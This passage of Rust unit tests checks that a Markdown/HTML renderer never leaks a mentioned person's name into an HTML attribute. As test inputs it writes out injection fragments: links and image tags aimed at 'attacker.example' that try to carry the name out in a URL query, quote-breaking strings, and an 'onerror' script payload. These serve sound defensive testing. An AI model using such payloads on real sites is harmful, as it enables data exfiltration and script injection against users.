        // One fewer than written, in an attribute or gone: not intact.
        let short = clean(&format!("<p>{one} and {own}.</p>"));
        assert!(!twice.intact(&short, clean), "{short}");
        let swallowed = clean(&format!("<p>{one} <i title='{one}'>x</i> {own}</p>"));
        assert!(!twice.intact(&swallowed, clean), "{swallowed}");
        // One more than written: not intact either.
        let extra = clean(&format!("<p>{one} {one} {one} {own}</p>"));
        assert!(!twice.intact(&extra, clean), "{extra}");
        // The same element without this render's class is not it.
        let unmarked_copy = whole.replace(&format!(" {mark}"), "");
        assert!(!twice.intact(&unmarked_copy, clean), "{unmarked_copy}");
        // Something else carries the mark (nothing can, but if it did).
        let stray = clean(&format!(
            r#"<p>{one} and {own}, {one}. <span class="mention {mark}">@Else</span></p>"#
        ));
        assert!(!twice.intact(&stray, clean), "{stray}");
        // Nothing written: nothing to look for.
        let nobody = Resolved::new();
        assert!(nobody.intact("anything", clean));
        // A body with as many different labels as its size allows: one
        // pass, not a search of the page for each.
        let many: Vec<String> = (0..3_000)
            .map(|n| format!(r#"<span class="mention-unresolved {mark}" title="Not linked to a person">@label {n}</span>"#))
            .collect();
        let page = clean(&format!("<p>{}</p>", many.join(" ")));
        let all = Resolved {
            mark: mark.to_string(),
            written: many,
        };
        assert!(all.intact(&page, clean));
        assert!(!all.intact(&page.replacen("@label 2999<", "@label 2998<", 1), clean));
    }

    /// SECURITY (fourth review of #362): a writer who has a list of names
    /// the person may have now types the mention's element once for each,
    /// beside a mention made to fall into their link's address. Were the
    /// check a count of elements anyone could type, the right guess would
    /// make it come out, and the name would go to that address.
    #[test]
    fn a_typed_copy_of_the_element_does_not_stand_in_for_a_mention() {
        let token = mention_token("x", ada());
        let id = ada().0.hyphenated();
        for mine in [true, false] {
            let guesses: String = ["Ada Byron", SECRET, "Ada Lovelace"]
                .iter()
                .map(|guess| {
                    if mine {
                        format!(r#"<a class="mention" href="/people/{id}">@{guess}</a>"#)
                    } else {
                        format!(r#"<span class="mention">@{guess}</span>"#)
                    }
                })
                .collect();
            let text = format!(
                "<div style=\"font-size:0\">{guesses}</div>\n\n<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            );
            for html in [
                crate::markdown::render_note(&text, &named(SECRET, mine)),
                crate::markdown::render_markdown(&text, &HashMap::new(), &named(SECRET, mine)),
                crate::markdown::render_body(&text, &HashMap::new(), &named(SECRET, mine)).html,
            ] {
                assert!(!in_an_attribute(&html, SECRET), "{html}");
                // The writer's link is no link: its HTML is shown as text.
                assert!(!in_an_attribute(&html, "attacker"), "{html}");
            }
        }
        // A class that looks like a render's own is not kept from a text:
        // each render allows only the one it made.
        let typed = r#"<span class="mention m-0123456789abcdef0123456789abcdef">x</span>"#;
        for html in [
            crate::markdown::render_note(typed, &named(SECRET, false)),
            crate::markdown::render_note(&format!("{typed} {token}"), &named(SECRET, false)),
        ] {
            assert!(!html.contains("m-0123456789abcdef"), "{html}");
        }
        // Two renders of one text do not share a class.
        let once = crate::markdown::render_note(&token, &named(SECRET, false));
        let again = crate::markdown::render_note(&token, &named(SECRET, false));
        assert_ne!(once, again);
        assert_eq!(unmarked(&once), unmarked(&again));
    }

    #[test]
    fn a_mention_is_one_beside_other_markdown() {
        let token = mention_token("x", ada());
        let people = named(SECRET, true);
        // After an image (the image has ended).
        let html = render_note(&format!("![pic](/favicon.ico) then {token}"), &people);
        assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
        // One in an image's alt text is left as it is, and does not cost
        // the others in the text their names.
        let html = render_note(&format!("![{token}](/favicon.ico) and {token}"), &people);
        assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
        // A stray end tag before it changes nothing.
        let html = render_note(&format!("</a> then {token}"), &people);
        assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
        // After a link of the writer's that is closed, a person is named
        // again.
        let html = render_note(
            &format!("<a href=\"https://e.example/\">a link</a> then {token}"),
            &people,
        );
        assert!(html.contains(&format!(">@{SECRET}</a>")), "{html}");
        // A label holds no `<`: with an autolink in it, this is a link
        // to nothing, not a mention, and what follows stays.
        let id = ada().0.hyphenated();
        let html = render_note(
            &format!("@[a <https://x.example> b](person:{id}) tail"),
            &people,
        );
        assert!(!html.contains(SECRET) && html.contains(" tail"), "{html}");
        // Nor with a wiki link in it: a label holds no `[`.
        for text in [
            format!("@[a [[x]] b](person:{id})"),
            format!("@[x [[a|b](person:{id})]]"),
        ] {
            let html = render_markdown(&text, &HashMap::new(), &people);
            assert!(!html.contains(SECRET), "{text} -> {html}");
        }
        // A link the writer wrote as a block of HTML: not resolved in it.
        let html = render_note(
            &format!("<a href=\"https://attacker.example/\">\n\n{token}\n\n</a>\n"),
            &named(SECRET, false),
        );
        assert!(!html.contains(SECRET), "{html}");
    }

    /// Many texts put together from pieces of Markdown, HTML and tokens.
    /// Whatever they are: a name is in no attribute, someone not in
    /// `people` is never named, and the events stay balanced.
    #[test]
    fn pieces_put_together_never_put_a_name_in_an_attribute() {
        use pulldown_cmark::{Event, Options, Parser};
        let bea = PersonId(Uuid::from_u128(0xbea));
        let id = ada().0.hyphenated().to_string();
        let token = mention_token("x", ada());
        let pieces: Vec<String> = [
            token.as_str(),
            token.as_str(),
            token.as_str(),
            &mention_token("Other", bea),
            &format!("@[a <https://x.example> b](person:{id})"),
            &format!("[r]: person:{id}"),
            &format!("(person:{id})"),
            "@[",
            "@",
            "](",
            "[",
            "]",
            "![",
            "](https://e.example/ \"t\")",
            "<div><a href='https://attacker.example/?q=",
            "<div><a href=\"https://attacker.example/?q=",
            "<div><a href=https://attacker.example/?q=",
            "<div title='",
            "<div></a><a href='https://attacker.example/?q=",
            "<pre></pre><a title=\"</a>\" href='https://attacker.example/?q=",
            "<p><img src='https://attacker.example/?q=",
            "<table><tr><td title='",
            "'>",
            "' <b>",
            "\">",
            "<a href=\"https://attacker.example/\">",
            "<a href='https://attacker.example/?",
            "</a>",
            "<span title=\"",
            "<span>",
            "</span>",
            "<!--",
            "-->",
            "`",
            "``",
            "```",
            "~~~",
            "*",
            "**",
            "_",
            "~~",
            "> ",
            "- ",
            "1. ",
            "    ",
            "# ",
            "## ",
            "---",
            "| a | b |\n|---|---|\n| ",
            " | ",
            "<div>",
            "</div>",
            "<pre>",
            "</pre>",
            "<script>",
            "</script>",
            "<style>",
            "</style>",
            "<textarea>",
            "</textarea>",
            "<svg>",
            "</svg>",
            "<math>",
            "<table>",
            "<title>",
            "<noscript>",
            "<select>",
            "<template>",
            "<details>",
            "<summary>",
            "<![CDATA[",
            "]]>",
            "<?",
            "?>",
            "<!",
            "[^1]",
            "[^1]: ",
            "\\",
            "&#64;",
            "&amp;",
            "&#xE000;",
            "[[",
            "]]",
            "[[Plan|",
            "[[Plan]]",
            "|",
            "<https://x.example>",
            "\t",
            "é👉",
            "word",
            "- [ ] ",
            "<b>",
            "</b>",
            "<img src=x onerror=alert(1)>",
            "'",
            "\"",
            ">",
            "<",
            "=",
        ]
        .iter()
        .map(|p| (*p).to_string())
        .collect();
        let gaps = ["", "", " ", "\n", "\n\n", "\r\n"];
        let titles: HashMap<String, NodeId> =
            [("plan".to_string(), NodeId(Uuid::from_u128(7)))].into();
        let options =
            Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TABLES | Options::ENABLE_TASKLISTS;
        let balanced = |events: &[Event<'_>]| {
            let mut depth = 0i64;
            for e in events {
                match e {
                    Event::Start(_) => depth += 1,
                    Event::End(_) => depth -= 1,
                    _ => {}
                }
                if depth < 0 {
                    return false;
                }
            }
            depth == 0
        };
        // A fixed sequence: the same texts on every run.
        let mut state = 0x5eed_1234_abcd_u64;
        let mut next = move || {
            state = state
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (state >> 33) as usize
        };
        let mut named_somewhere = 0usize;
        for _ in 0..4_000 {
            let mut text = String::new();
            for _ in 0..2 + next() % 7 {
                text.push_str(&pieces[next() % pieces.len()]);
                text.push_str(gaps[next() % gaps.len()]);
            }
            for mine in [true, false] {
                let people = named(SECRET, mine);
                let parsed: Vec<_> = Parser::new_ext(&text, options).into_offset_iter().collect();
                let was_balanced =
                    balanced(&parsed.iter().map(|(e, _)| e.clone()).collect::<Vec<_>>());
                let nowhere = crate::wikilink::Moved::nowhere();
                let tokens = super::Token::all(&text, &nowhere);
                let (events, _) = super::with_mentions(parsed, &tokens, &nowhere, &people);
                assert!(!was_balanced || balanced(&events), "{text:?}");
                for html in [
                    render_note(&text, &people),
                    render_markdown(&text, &titles, &people),
                    render_body(&text, &titles, &people).html,
                ] {
                    assert!(!in_an_attribute(&html, SECRET), "{text:?} -> {html}");
                    assert!(!html.contains("@Other</a>"), "{text:?} -> {html}");
                    assert!(
                        !html.contains("class=\"mention\">@Other"),
                        "{text:?} -> {html}"
                    );
                    named_somewhere += usize::from(html.contains(SECRET));
                }
            }
        }
        // The pieces do make real mentions: the test is not vacuous.
        assert!(named_somewhere > 500, "{named_somewhere}");
    }
}
